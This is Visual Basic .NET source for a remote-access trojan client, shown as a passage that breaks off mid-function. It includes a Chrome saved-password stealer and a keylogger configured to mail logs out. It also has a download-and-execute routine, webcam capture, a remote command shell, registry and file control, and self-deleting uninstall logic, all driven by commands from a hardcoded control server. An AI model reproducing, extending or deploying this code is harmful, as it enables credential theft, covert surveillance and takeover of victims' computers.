client=Imports System.Net.Mail
    Imports System.Net.Sockets
    Imports System.Runtime.InteropServices
    Imports System.Management
    Imports System
    Imports System.IO
    Imports System.Object
    Imports System.Drawing
    Imports System.Windows.Forms
    Imports Microsoft.VisualBasic.Interaction
    Imports System.Reflection
    Imports Microsoft.VisualBasic
    Imports System.Data
    Imports System.Data.SqlClient
    Imports System.Collections.Generic
    Imports System.Text
    Imports System.Collections
    Imports System.Security.Principal
    Imports System.Diagnostics
    Imports System.Threading
    Imports System.Net
    Imports System.Text.RegularExpressions
    Imports System.Xml
    Imports Microsoft.Win32
    Imports System.IO.Compression
    Imports System.Configuration
    Imports System.Drawing.Imaging
    Imports System.Drawing.Drawing2D
    Imports System.Security.Cryptography
    Imports System.Runtime.Serialization.Formatters.Binary
     
    <Assembly: AssemblyTitle("AdministrationApplication")>
    <Assembly: AssemblyDescription("AdministrationDesc")>
    <Assembly: AssemblyCompany("ThatPixel")>
    <Assembly: AssemblyProduct("AdministrationProduct")>
    <Assembly: AssemblyCopyright("CopyrightHere")>
    <Assembly: AssemblyTrademark("TrademarkHere")>
    <Assembly: AssemblyVersion("2.2.2.2")>
    <Assembly: AssemblyFileVersion("1.1.1.1")>
    <Assembly: Guid("523e2cdb-4a0a-46e7-8ba1-e2037bb534de")>
     
    Namespace Program
    Public Class Main
     
       Shared Sub Main()
           Dim form1 As Form = New Client
           Application.Run(form1)
       End Sub
    End Class
    Public Class c
     
        Public Shared ip As String = "127.0.0.1"
        Public Shared port As Integer = 3480
        Public Shared pwd As String = "p4sw00rd" ' the password used to connect
        Public Shared identification As String = "CMESH"
        Public Shared startup As Boolean = False
        Public Shared startupdir As String = Application.ExecutablePath
        Public Shared startupkey As String = "AdministrationKey"
        Public Shared message As Boolean = False
        Public Shared startupmessage As String = "Hello there"
        Public Shared startuptitle As String = "theTitle"
        Public Shared icon As String = "2"
        Public Shared obfusc As Boolean = True
        Public Shared mutex As String = "mutexor"
     
     
     
        Public Shared visible As Boolean = True
     
     
        '''''''''''''''''''''''
        'keylogger
        '''''''''''''''''''''''''''''
     
       
     
     
        Public Shared toofflinelog As Boolean = False
        Public Shared mail As String = "EMAIL@EMAIL"
        Public Shared mailpwd As String = "PWD@PWD"
        Public Shared smtp As String = "SMTP@SMTP"
        Public Shared interval As String = 30000
     
    End Class
    <Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
    Partial Class chat
        Inherits System.Windows.Forms.Form
     
        'Form overrides dispose to clean up the component list.
        <System.Diagnostics.DebuggerNonUserCode()> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try
                If disposing AndAlso components IsNot Nothing Then
                    components.Dispose()
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub
     
        'Required by the Windows Form Designer
        Private components As System.ComponentModel.IContainer
     
        'NOTE: The following procedure is required by the Windows Form Designer
        'It can be modified using the Windows Form Designer.  
        'Do not modify it using the code editor.
        <System.Diagnostics.DebuggerStepThrough()> _
        Private Sub InitializeComponent()
            Me.RichTextBox1 = New System.Windows.Forms.RichTextBox()
            Me.Button1 = New System.Windows.Forms.Button()
            Me.TextBox1 = New System.Windows.Forms.TextBox()
            Me.SuspendLayout()
            '
            'RichTextBox1
            '
            Me.RichTextBox1.Anchor = CType((((System.Windows.Forms.AnchorStyles.Top Or System.Windows.Forms.AnchorStyles.Bottom) _
                        Or System.Windows.Forms.AnchorStyles.Left) _
                        Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
            Me.RichTextBox1.Location = New System.Drawing.Point(3, 4)
            Me.RichTextBox1.Name = "RichTextBox1"
            Me.RichTextBox1.Size = New System.Drawing.Size(436, 252)
            Me.RichTextBox1.TabIndex = 0
            Me.RichTextBox1.Text = ""
            '
            'Button1
            '
            Me.Button1.Anchor = CType((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
            Me.Button1.Location = New System.Drawing.Point(379, 260)
            Me.Button1.Name = "Button1"
            Me.Button1.Size = New System.Drawing.Size(60, 23)
            Me.Button1.TabIndex = 2
            Me.Button1.Text = "Send"
            Me.Button1.UseVisualStyleBackColor = True
            '
            'TextBox1
            '
            Me.TextBox1.Anchor = CType(((System.Windows.Forms.AnchorStyles.Bottom Or System.Windows.Forms.AnchorStyles.Left) _
                        Or System.Windows.Forms.AnchorStyles.Right), System.Windows.Forms.AnchorStyles)
            Me.TextBox1.Location = New System.Drawing.Point(3, 262)
            Me.TextBox1.Name = "TextBox1"
            Me.TextBox1.Size = New System.Drawing.Size(370, 20)
            Me.TextBox1.TabIndex = 3
            '
            'chat
            '
            Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
            Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
            Me.ClientSize = New System.Drawing.Size(443, 287)
            Me.Controls.Add(Me.TextBox1)
            Me.Controls.Add(Me.Button1)
            Me.Controls.Add(Me.RichTextBox1)
            Me.FormBorderStyle = System.Windows.Forms.FormBorderStyle.SizableToolWindow
            Me.Name = "chat"
            Me.Text = "Conversation with Admin"
            Me.ResumeLayout(False)
            Me.PerformLayout()
     
        End Sub
        Friend WithEvents RichTextBox1 As System.Windows.Forms.RichTextBox
        Friend WithEvents Button1 As System.Windows.Forms.Button
        Friend WithEvents TextBox1 As System.Windows.Forms.TextBox
    End Class
     
     
    Public Class chat
        Private Const EM_SETCUEBANNER As Integer = &H1501
     
        <DllImport("user32.dll", CharSet:=CharSet.Auto)> _
        Private Shared Function SendMessage(ByVal hWnd As IntPtr, ByVal msg As Integer, ByVal wParam As Integer, <MarshalAs(UnmanagedType.LPWStr)> ByVal lParam As String) As Int32
        End Function
        Private Sub SetCueText(ByVal control As Control, ByVal text As String)
            SendMessage(control.Handle, EM_SETCUEBANNER, 0, text)
        End Sub
        Dim r As New Random()
        Sub moveme()
            CheckForIllegalCrossThreadCalls = False
            Dim origpos As New Point(Me.Location)
            Dim b As Integer
            For b = 0 To 2
                Dim i As Integer
                For i = 0 To 4
                    System.Threading.Thread.Sleep(100)
                    Select Case i
                        Case 1
                            Me.Location = New Point(Me.Location.X - 20, Me.Location.Y - 20)
                        Case 2
                            Me.Location = New Point(Me.Location.X + 20, Me.Location.Y + 20)
                        Case 3
                            Me.Location = New Point(Me.Location.X - 20, Me.Location.Y + 20)
                        Case 4
                            Me.Location = New Point(Me.Location.X + 20, Me.Location.Y - 20)
                    End Select
                Next
            Next
            Me.Location = origpos
        End Sub
        Sub moveit()
            Me.Invoke(New del(AddressOf moveme))
        End Sub
        Delegate Sub del()
        Sub alert()
            Me.TopMost = True
            Me.Focus()
            Me.BringToFront()
            Me.TopMost = False
            Dim s As New System.Threading.Thread(AddressOf moveme)
            s.Start()
     
        End Sub
        Sub setmsg(ByVal text As String)
            RichTextBox1.Text &= "Admin says: " & vbNewLine & vbTab & text & vbNewLine
            RichTextBox1.SelectionStart = RichTextBox1.Text.Length
            RichTextBox1.ScrollToCaret()
        End Sub
     
     
        Private Sub chat_Load(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles MyBase.Load
     
            SetCueText(TextBox1, "Type here and press enter to send a message...")
            Me.TopMost = True
            Me.Focus()
            Me.BringToFront()
            Me.TopMost = False
     
     
        End Sub
        Private Sub TextBox5_KeyDown(ByVal sender As Object, ByVal e As System.Windows.Forms.KeyEventArgs) Handles TextBox1.KeyDown
            If e.KeyCode = Keys.Enter Then
                sendchatmessage(TextBox1.Text)
            End If
        End Sub
        Private Sub Button8_Click(ByVal sender As System.Object, ByVal e As System.EventArgs) Handles Button1.Click
            sendchatmessage(TextBox1.Text)
        End Sub
        Sub sendchatmessage(ByVal text As String)
            TextBox1.Text = ""
            RichTextBox1.Text &= "You say:" & vbNewLine & vbTab & text & vbNewLine
            RichTextBox1.SelectionStart = RichTextBox1.Text.Length
            RichTextBox1.ScrollToCaret()
     
     
     
            Client.senddata("CHMSG|" & text)
        End Sub
     
    End Class
    '**************************************************************
    '
    '               Coded By: RockingWithTheBest
    '
    '                           v 0.1
    '
    '**************************************************************
     
     
     
     
     
    Module Chrome
     
        Public cPass As String
        Public Function GetChrome() As String(,)
            Dim datapath As String = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\Google\Chrome\User Data\Default\Login Data"
     
            Dim i As Integer = 0
     
            Dim stuff(,) As String
     
            Try
                Dim SQLDatabase = New SQLiteHandler(datapath)
                SQLDatabase.ReadTable("logins")
     
                If File.Exists(datapath) Then
     
                    Dim host, user, pass As String
                    Dim mArray(SQLDatabase.GetRowCount() - 1, 2) As String
                    For i = 0 To SQLDatabase.GetRowCount() - 1 Step 1
                        host = SQLDatabase.GetValue(i, "origin_url")
                        user = SQLDatabase.GetValue(i, "username_value")
                        pass = Decrypt(System.Text.Encoding.Default.GetBytes(SQLDatabase.GetValue(i, "password_value")))
     
     
                        If (user <> "") And (pass <> "") Then
                            mArray(i, 0) = host
                            mArray(i, 1) = user
                            mArray(i, 2) = pass
     
                        End If
                    Next
                    stuff = mArray
                End If
            Catch e As Exception
     
            End Try
            Return stuff
        End Function
        <DllImport("Crypt32.dll", SetLastError:=True, CharSet:=System.Runtime.InteropServices.CharSet.Auto)> _
        Private Function CryptUnprotectData(ByRef pDataIn As DATA_BLOB, ByVal szDataDescr As String, ByRef pOptionalEntropy As DATA_BLOB, ByVal pvReserved As IntPtr, ByRef pPromptStruct As CRYPTPROTECT_PROMPTSTRUCT, ByVal dwFlags As Integer, ByRef pDataOut As DATA_BLOB) As Boolean
        End Function
        <Flags()> Enum CryptProtectPromptFlags
            CRYPTPROTECT_PROMPT_ON_UNPROTECT = &H1
            CRYPTPROTECT_PROMPT_ON_PROTECT = &H2
        End Enum
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure CRYPTPROTECT_PROMPTSTRUCT
            Public cbSize As Integer
            Public dwPromptFlags As CryptProtectPromptFlags
            Public hwndApp As IntPtr
            Public szPrompt As String
        End Structure
        <StructLayout(LayoutKind.Sequential, CharSet:=CharSet.Unicode)> Structure DATA_BLOB
            Public cbData As Integer
            Public pbData As IntPtr
        End Structure
        Function Decrypt(ByVal Datas() As Byte) As String
            Dim inj, Ors As New DATA_BLOB
            Dim Ghandle As GCHandle = GCHandle.Alloc(Datas, GCHandleType.Pinned)
            inj.pbData = Ghandle.AddrOfPinnedObject()
            inj.cbData = Datas.Length
            Ghandle.Free()
            CryptUnprotectData(inj, Nothing, Nothing, Nothing, Nothing, 0, Ors)
            Dim Returned() As Byte = New Byte(Ors.cbData) {}
            Marshal.Copy(Ors.pbData, Returned, 0, Ors.cbData)
            Dim TheString As String = Encoding.Default.GetString(Returned)
            Return TheString.Substring(0, TheString.Length - 1)
        End Function
     
    End Module
    <Global.Microsoft.VisualBasic.CompilerServices.DesignerGenerated()> _
    Partial Class Client
        Inherits System.Windows.Forms.Form
     
        'Form overrides dispose to clean up the component list.
        <System.Diagnostics.DebuggerNonUserCode()> _
        Protected Overrides Sub Dispose(ByVal disposing As Boolean)
            Try
                If disposing AndAlso components IsNot Nothing Then
                    components.Dispose()
                End If
            Finally
                MyBase.Dispose(disposing)
            End Try
        End Sub
     
        'Required by the Windows Form Designer
        Private components As System.ComponentModel.IContainer
     
        'NOTE: The following procedure is required by the Windows Form Designer
        'It can be modified using the Windows Form Designer.  
        'Do not modify it using the code editor.
        <System.Diagnostics.DebuggerStepThrough()> _
        Private Sub InitializeComponent()
            Me.Timer1 = New System.Windows.Forms.Timer()
            Me.SuspendLayout()
            '
            'Timer1
            '
            '
            'Client
            '
            Me.AutoScaleDimensions = New System.Drawing.SizeF(6.0!, 13.0!)
            Me.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font
            Me.ClientSize = New System.Drawing.Size(116, 0)
            Me.Name = "Client"
            Me.Text = "Client"
            Me.ResumeLayout(False)
     
        End Sub
        Friend WithEvents Timer1 As System.Windows.Forms.Timer
     
    End Class
     
     
     
     
     
     
     
     
     
     
     
    Public Class Client
        Shared t As New TcpClient
        Dim ip As String
        Dim port As Integer
        Sub connect(ByVal ip As String, ByVal port As Integer)
            CheckForIllegalCrossThreadCalls = False
            t = New TcpClient
            Try
                t.Connect(ip, port) 'tries to connect
                If t.Connected Then 'if connected, start the reading procedure
     
                    t.GetStream.BeginRead(New Byte() {0}, 0, 0, AddressOf doread, Nothing)
                    login() 'send our details to the server
                End If
     
            Catch ex As Exception
     
                t.Close()
     
                System.Threading.Thread.Sleep(10000) 'if an error occurs sleep for 10 seconds
                connect(c.ip, c.port) 'try to reconnect
            End Try
        End Sub
        Sub login()
            senddata(logindetails.info) 'log in to the chatserver
        End Sub
        Shared Sub senddata(ByVal message As Object)
            Dim sw As New StreamWriter(t.GetStream) 'declare a new streamwriter
            sw.WriteLine(message) 'write the message
            sw.Flush()
     
        End Sub
        Sub clirefresh()
            t.Close()
            connect(c.ip, c.port)
        End Sub
        Sub messagerecieved(ByVal message As String)
            Dim msg() As String = message.Split("|") ' if a message is recieved, split it to process it
     
     
            Select Case msg(0) 'process it by the first element in the split array
     
     
     
     
                Case "DIE"
                    Application.Exit()
                Case "REFR"
                    clirefresh()
                    ''''''''''''remote control
                Case "CLICKL"
                    Me.Invoke(New tripledelm(AddressOf mclick), True, msg(1), msg(2))
                Case "CLICKR"
                    Me.Invoke(New tripledelm(AddressOf mclick), False, msg(1), msg(2))
                Case "IMG"
                    sendimage()
                Case "PRS"
                    Me.Invoke(New paradel(AddressOf whichkey), msg(1))
                Case "QUAL"
                    rc.quality = msg(1)
     
     
                    '''''''''''''file manager''''''''''''
                Case "FDRIVES"
                    senddrives()
                Case "FLDR"
                    sendpath(msg(1))
                Case "QDR"
                    custdir(msg(1))
                Case "RUNF"
                    Me.Invoke(New paradel(AddressOf runfile), msg(1))
                Case "RENF"
                    renamefile(msg(1), msg(2), msg(3))
                Case "DELF"
                    deletefile(msg(1))
                Case "REQD"
                    filedets(msg(1))
                Case "REQF"
                    Dim r As New System.Threading.Thread(New ParameterizedThreadStart(AddressOf startfiledl))
                    r.Start(msg(1))
                Case "CF"
                    'cancel file
                    cancelfile(msg(1))
     
     
                    ''''''''''''''''''''PROCESSES''''''''''''''''''''''''''
                Case "PROC"
                    sendprocesses()
                Case "PKILL"
                    killprocess(msg(1))
                Case "PINFO"
                    sendprocessinfo(msg(1))
     
     
                    ''''''''''''''''''''' APPLICATION CONTROL '''''''''''''''''''''
                Case "APFO"
                    sendappinfo()
                Case "DELS"
                    deletestartup(msg(1))
                Case "DELK"
                    deletekey(msg(1))
     
     
     
                    ''''''''''''''''''''''registry'''''''''''''''''''''''''''''''''
                Case "REGS"
     
     
                Case "REGD"
     
                    Me.Invoke(New duodel(AddressOf deleteregkey), msg(1), msg(2))
                Case "REGK"
                    Dim dat As String = message.Replace(msg(0) & "|", "")
                    'need to send keydata
                    Me.Invoke(New paradel(AddressOf setkey), dat)
                Case "REGH"
                    Dim dat As String = message.Replace(msg(0) & "|", "")
                    Me.Invoke(New paradel(AddressOf sethive), dat)
                Case "NRK"
                    '  Me.Invoke(New tripledelm(AddressOf newregkey), msg(1), msg(2), msg(3))
                    newregkey(msg(1), msg(2), msg(3))
     
                    '''''''''''''''''CMD commands
                Case "CMDS"
                    CMD_Start()
                Case "CMDW"
                    WRITECMD(msg(1))
                Case "CMDF"
                    CMDSTP()
     
                    '''''''''''''''''''keyloggger!!
     
                Case "KLOGS"
                    Me.Invoke(New del(AddressOf startkeybd))
     
                Case "KLOGF"
                    Me.Invoke(New del(AddressOf stopkeybd))
     
     
     
                    '''''''''''''''chat
     
     
                Case "CHMSG"
                    Me.Invoke(New paradel(AddressOf showchat), msg(1))
                Case "CHALERT"
                    Me.Invoke(New del(AddressOf alertchat))
                    '''''''''''''''''remote script
                Case "SCRIPT"
                    Select Case msg(1)
                        Case "S"
                            Me.Invoke(New del(AddressOf setscript))
     
                        Case "P"
                            Me.Invoke(New paradel(AddressOf writescript), msg(2))
                        Case Else
                            Me.Invoke(New paradel(AddressOf execscript), msg(1))
     
                    End Select
     
                    ''''''''''informations
                Case "INFOCLI"
                    sendcliinfo()
                Case "INFOSYS"
                    sendsysinfo()
     
                    ''''''''''''''''website
                Case "ST"
                    Me.Invoke(New paradel(AddressOf website), msg(1))
     
     
     
     
     
                    '''''''''''''webcam
     
                Case "WC"
                    sendcam()
                Case "WQUAL"
                    webcam.quality = msg(1)
                Case "WCS"
                    stopcam()
     
     
     
                    '''''''''passwords
                Case "GETPASS"
                    Me.Invoke(New del(AddressOf getpasswords))
     
                    ''''''''''''misc
                Case "MSGB"
                    Me.Invoke(New singledel(AddressOf showmsgb), msg(1))
                Case "TXT2SPEECH"
                    speak(msg(1))
     
                    '''''''''''system operations
                Case "SYS"
                    Me.Invoke(New singledel(AddressOf systemoperation), message.Replace("SYS|", ""))
     
                    '''''''''''''download and execute file
                Case "DLURL"
                    Me.Invoke(New singledel(AddressOf dlexecute), msg(1))
     
                    ''''''''''''''CLIENT UPDATE
                Case "UPDURL"
                    Me.Invoke(New singledel(AddressOf updateurl), msg(1))
     
     
                    '''''''''''FILE UPLOADING
                Case "FUS"
                    Me.Invoke(New singledel(AddressOf fileuploadstart), msg(1))
                Case "FUP"
                    Me.Invoke(New duodel(AddressOf fileuploadpart), msg(1).Split("~")(0), msg(1).Split("~")(1))
                Case "FUF"
                    Me.Invoke(New duodel(AddressOf finishuploadfile), msg(1), msg(2))
                Case "CUF"
                    Me.Invoke(New duodel(AddressOf finishuploadclientfile), msg(1), msg(2))
     
     
     
                    '''''''''''''''uninstalling
                Case "UNSTL"
                    Me.Invoke(New del(AddressOf uninstallme))
     
                    ''''''thumbnailks
                Case "BTH"
     
     
     
                    Me.Invoke(New paradel(AddressOf startthumb), message)
     
            End Select
     
     
     
     
     
        End Sub
     
        Delegate Sub del()
        Delegate Sub singledel(ByVal param1 As Object)
        Delegate Sub duodel(ByVal param1 As Object, ByVal param2 As Object)
        Sub sendlog(ByVal loginfo As String, ByVal logcolour As Object)
            Me.Invoke(New singledel(AddressOf senddata), "ADLG|" & loginfo & "|" & logcolour)
     
     
        End Sub
    #Region "thumbnails"
        Public Sub startthumb(ByVal which As String)
     
            If which.Contains("1") Then
     
                rc.shouldthumb = True
                rc.startminithumb()
            Else
                rc.shouldthumb = False
            End If
        End Sub
    #End Region
    #Region "uninstall"
        Sub uninstallme()
            Try
                startup.removestartup(c.startupkey)
            Catch ex As Exception
     
            End Try
            Try
                Dim Info As New ProcessStartInfo()
                Info.Arguments = "/C ping 1.1.1.1 -n 1 -w 1000 > Nul & Del """ + (New Uri(Assembly.GetExecutingAssembly().CodeBase)).LocalPath & """"
                Info.CreateNoWindow = True
                Info.WindowStyle = ProcessWindowStyle.Hidden
                Info.FileName = "cmd.exe"
                Process.Start(Info)
                Application.[Exit]()
            Catch ex As Exception
     
            End Try
        End Sub
    #End Region
    #Region "file uploading"
        Dim uploads As New Hashtable
        Public Function getuploadfile(ByVal id As Object) As upfile
            Dim entry As New DictionaryEntry
            Dim returned As Boolean = False
            For Each item As DictionaryEntry In uploads
                If item.Key.ToString.Trim.ToLower.Contains(id.ToString.ToLower.Trim) Then
                    returned = True
                    Return item.Value
     
                End If
            Next
            If returned = False Then
                Return Nothing
            End If
        End Function
        Sub finishuploadfile(ByVal id As Object, ByVal path As Object)
            Dim filetoadd As upfile = getuploadfile(id)
            't.GetStream.Flush()
            Try
                For Each item As DictionaryEntry In uploads
                    Try
                        If item.Key.ToString.Contains(id) Then
     
                            uploads.Remove(item.Key)
                        End If
                    Catch ex As Exception
     
                    End Try
     
                Next
            Catch
            End Try
            If filetoadd IsNot Nothing Then
     
                If filetoadd.finish(path) Then
                    senddata("FUS|" & id)
                Else
                    senddata("FUX|" & id)
                End If
            End If
     
        End Sub
        Sub fileuploadpart(ByVal id As Object, ByVal part As Object)
            Dim filetoadd As upfile = getuploadfile(id)
            If filetoadd IsNot Nothing Then
                filetoadd.addpart(part)
            End If
        End Sub
        Sub fileuploadstart(ByVal id As Object)
            Dim uploadfile As New upfile(id)
            Try
                For Each item As DictionaryEntry In uploads
                    Try
                        If item.Key.ToString.Contains(id) Then
     
                            uploads.Remove(item.Key)
                        End If
                    Catch ex As Exception
     
                    End Try
     
                Next
            Catch
            End Try
     
            uploads.Add(id, uploadfile)
        End Sub
    #End Region
    #Region "tcpclientupdate"
        Sub finishuploadclientfile(ByVal id As Object, ByVal filename As Object)
            Dim filetoadd As upfile = getuploadfile(id)
            't.GetStream.Flush()
            Dim updfailed As Boolean = False
            Dim newfile As Byte()
            Try
                newfile = file64.Decompress(Convert.FromBase64String(filetoadd.filestring.Trim))
            Catch ex As Exception
                updfailed = True
     
     
     
     
            End Try
     
            If updfailed Then
                senddata("UPDF|" & id)
            Else
     
     
                Dim tempname As String = ""
                tempname &= "admin"
                Dim i As Integer
                For i = 0 To 5
                    tempname &= Chr(New Random().Next(65, 90))
                Next
                tempname &= ".exe"
     
                'k so we got a filename
                'lets make a filepath
                Dim dirpath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\"
                Try
                    System.IO.Directory.CreateDirectory(dirpath)
                Catch ex As Exception
                End Try
     
                Dim isself As Boolean
                'make sure that our directory exists
                If Application.ExecutablePath = dirpath & filename Then
                    isself = True
                End If
     
     
                If isself Then
                    'we need to use the temppath
                    dirpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\7pixels\"
                    Try
                        System.IO.Directory.CreateDirectory(dirpath)
                    Catch ex As Exception
                    End Try
                    Try
                        System.IO.File.Delete(dirpath & filename)
                    Catch ex As Exception
     
                    End Try
                    System.IO.File.WriteAllBytes(dirpath & filename, newfile)
                    ' My.Computer.Network.DownloadFile(url, dirpath & filename)
                    Dim final As String = dirpath & filename
                    startnewfilem(final, id)
                Else
     
                    Try
                        findandkill(dirpath & filename)
                    Catch ex As Exception
                    End Try
                    'we can do anything with the file now
                    Try
                        System.IO.File.Delete(dirpath & filename)
                    Catch ex As Exception
     
                    End Try
     
                    Try
                        System.IO.File.WriteAllBytes(dirpath & filename, newfile)
     
                        startnewfilem(dirpath & filename, id) 'run it
                    Catch ex As Exception
                        dirpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\7pixels\"
                        Try
                            System.IO.Directory.CreateDirectory(dirpath)
                        Catch
                        End Try
                        Try
                            findandkill(dirpath & filename)
                        Catch
     
                        End Try
                        Try
                            System.IO.File.Delete(dirpath & filename)
                        Catch
     
                        End Try
                        System.IO.File.WriteAllBytes(dirpath & filename, newfile)
                        startnewfilem(dirpath & filename, id) 'run it
                    End Try
                End If
                Try
     
                Catch ex As Exception
     
                End Try
            End If
        End Sub
     
    #End Region
    #Region "updurl"
        Sub updateurl(ByVal url As Object)
            Dim fullpath As String = url
            Dim filename As String = ""
            Dim tempname As String = ""
            tempname &= "admin"
            Dim i As Integer
            For i = 0 To 5
                tempname &= Chr(New Random().Next(65, 90))
            Next
            tempname &= ".exe"
            Try
                filename = url.Split("/")(url.Split("/").Length - 1)
            Catch ex As Exception
     
                filename = tempname
            End Try
            'k so we got a filename
            'lets make a filepath
            Dim dirpath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\"
            Try
                System.IO.Directory.CreateDirectory(dirpath)
            Catch ex As Exception
            End Try
     
            Dim isself As Boolean
            'make sure that our directory exists
            If Application.ExecutablePath = dirpath & filename Then
                isself = True
            End If
     
     
            If isself Then
                'we need to use the temppath
                dirpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\7pixels\"
                Try
                    System.IO.Directory.CreateDirectory(dirpath)
                Catch ex As Exception
                End Try
                Try
                    System.IO.File.Delete(dirpath & filename)
                Catch ex As Exception
     
                End Try
                My.Computer.Network.DownloadFile(url, dirpath & filename)
                Dim final As String = dirpath & filename
                startnewfile(final)
            Else
     
                Try
                    findandkill(dirpath & filename)
                Catch ex As Exception
                End Try
                'we can do anything with the file now
                Try
                    System.IO.File.Delete(dirpath & filename)
                Catch ex As Exception
     
                End Try
     
                Try
                    My.Computer.Network.DownloadFile(url, dirpath & filename) 'download it
                    startnewfile(dirpath & filename) 'run it
                Catch ex As Exception
                    dirpath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\7pixels\"
                    Try
                        System.IO.Directory.CreateDirectory(dirpath)
                    Catch
                    End Try
                    Try
                        findandkill(dirpath & filename)
                    Catch
     
                    End Try
                    Try
                        System.IO.File.Delete(dirpath & filename)
                    Catch
     
                    End Try
                    My.Computer.Network.DownloadFile(url, dirpath & filename) 'download it
                    startnewfile(dirpath & filename) 'run it
                End Try
            End If
            Try
     
            Catch ex As Exception
     
            End Try
     
     
        End Sub
        Sub startnewfile(ByVal final As String)
     
            startup.disposeinstance()
            c.mutex = "pixel"
            startup.checkrunning()
            t.Close()
     
            Process.Start(final)
            Environment.Exit(0)
        End Sub
        Sub startnewfilem(ByVal final As String, ByVal id As String)
     
            startup.disposeinstance()
            c.mutex = "pixel"
            startup.checkrunning()
            t.Close()
     
            Process.Start(final)
            Environment.Exit(0)
        End Sub
    #End Region
    #Region "download and execute"
        Sub dlexecute(ByVal url As Object)
            Dim filename As String = url
            Try
     
                filename = url.Split("/")(url.Split("/").Length - 1)
                Try
                    System.IO.Directory.CreateDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\")
                Catch ex As Exception
     
                End Try
                Dim finalpath As String = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) & "\pixels\" & filename
                Try
                    findandkill(finalpath)
                Catch ex As Exception
     
                End Try
                Dim wc As New WebClient
                Try
                    wc.DownloadFile(New Uri(url), finalpath)
                Catch
                End Try
                Process.Start(finalpath)
                sendlog("Successfully downloaded and executed: " & filename, "green")
            Catch ex As Exception
                sendlog("An error ocurrued while attempting to download and execute " & filename, "red")
            End Try
        End Sub
    #End Region
    #Region "system operations"
     
    #Region "api"
        Private Declare Function ShowCursor Lib "user32" (ByVal bShow As Long) As Long
        Private Declare Function SystemParametersInfo Lib "user32" Alias "SystemParametersInfoA" (ByVal uAction As Integer, ByVal uParam As Integer, ByVal lpvParam As String, ByVal fuWinIni As Integer) As Integer
     
        'constants to be used with the above api
        Private Const SPI_SETDESKWALLPAPER = 20
        Private Const SPIF_UPDATEINIFILE = &H1
        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
        Private Shared Function FindWindow( _
            ByVal lpClassName As String, _
            ByVal lpWindowName As String) As IntPtr
        End Function
     
        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
        Private Shared Function GetWindow( _
            ByVal hWnd As IntPtr, _
            ByVal uCmd As UInteger) As IntPtr
        End Function
     
        Private Enum GetWindowCmd As UInteger
            GW_HWNDFIRST = 0
            GW_HWNDLAST = 1
            GW_HWNDNEXT = 2
            GW_HWNDPREV = 3
            GW_OWNER = 4
            GW_CHILD = 5
            GW_ENABLEDPOPUP = 6
        End Enum
     
        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
        Private Shared Function ShowWindow( _
            ByVal hwnd As IntPtr, _
            ByVal nCmdShow As Int32) As Boolean
        End Function
     
        Private Enum SW As Int32
            Hide = 0
            Normal = 1
            ShowMinimized = 2
            ShowMaximized = 3
            ShowNoActivate = 4
            Show = 5
            Minimize = 6
            ShowMinNoActive = 7
            ShowNA = 8
            Restore = 9
            ShowDefault = 10
            ForceMinimize = 11
            Max = 11
        End Enum
        <DllImport("user32.dll", SetLastError:=True, CharSet:=CharSet.Auto)> _
        Private Shared Function IsWindowVisible(ByVal hwnd As IntPtr) As Boolean
        End Function
     
        Public Shared Sub Toggle()
            Dim hWnd As IntPtr = FindWindow("ProgMan", Nothing)
            hWnd = GetWindow(hWnd, GetWindowCmd.GW_CHILD)
     
            If IsWindowVisible(hWnd) Then
                ShowWindow(hWnd, SW.Hide)
            Else
                ShowWindow(hWnd, SW.ShowNoActivate)
            End If
     
        End Sub
     
        'this is declaration to open and close the cdrom tray
        Declare Function mciSendString Lib "winmm.dll" Alias "mciSendStringA" _
           (ByVal lpszCommand As String, ByVal lpszReturnString As String, _
           ByVal cchReturnLength As Long, ByVal hwndCallback As Long) As Long
        Private Declare Function BlockInput Lib "user32" (ByVal fBlock As Long) As Long
    #End Region
        Dim mousehidden As Boolean = False
        Sub systemoperation(ByVal info As Object)
            Dim parts() As String = info.Split("|")
            Select Case parts(0)
                Case "LOGOFF"
                    Try
                        Dim t As Single
                        Dim objWMIService, objComputer As Object
                        objWMIService = GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}")
                        For Each objComputer In objWMIService.InstancesOf("Win32_OperatingSystem")
                            t = objComputer.Win32Shutdown(0, 0)
                        Next
                        sendlog("Logging off...", "green")
                    Catch
                        sendlog("Could not log off", "red")
                    End Try
     
                Case "SHUTDOWN"
                    Try
                        Dim t As Single
                        Dim objWMIService, objComputer As Object
                        objWMIService = GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}")
                        For Each objComputer In objWMIService.InstancesOf("Win32_OperatingSystem")
                            t = objComputer.Win32Shutdown(8 + 4, 0)
                        Next
                        sendlog("Shutting down", "green")
                    Catch
                        sendlog("Could not shut down", "red")
                    End Try
                Case "RESTART"
                    Try
                        Dim t As Single
                        Dim objWMIService, objComputer As Object
                        objWMIService = GetObject("Winmgmts:{impersonationLevel=impersonate,(Debug,Shutdown)}")
                        For Each objComputer In objWMIService.InstancesOf("Win32_OperatingSystem")
                            t = objComputer.Win32Shutdown(2 + 4, 0)
                        Next
                        sendlog("Restarting...", "green")
                    Catch
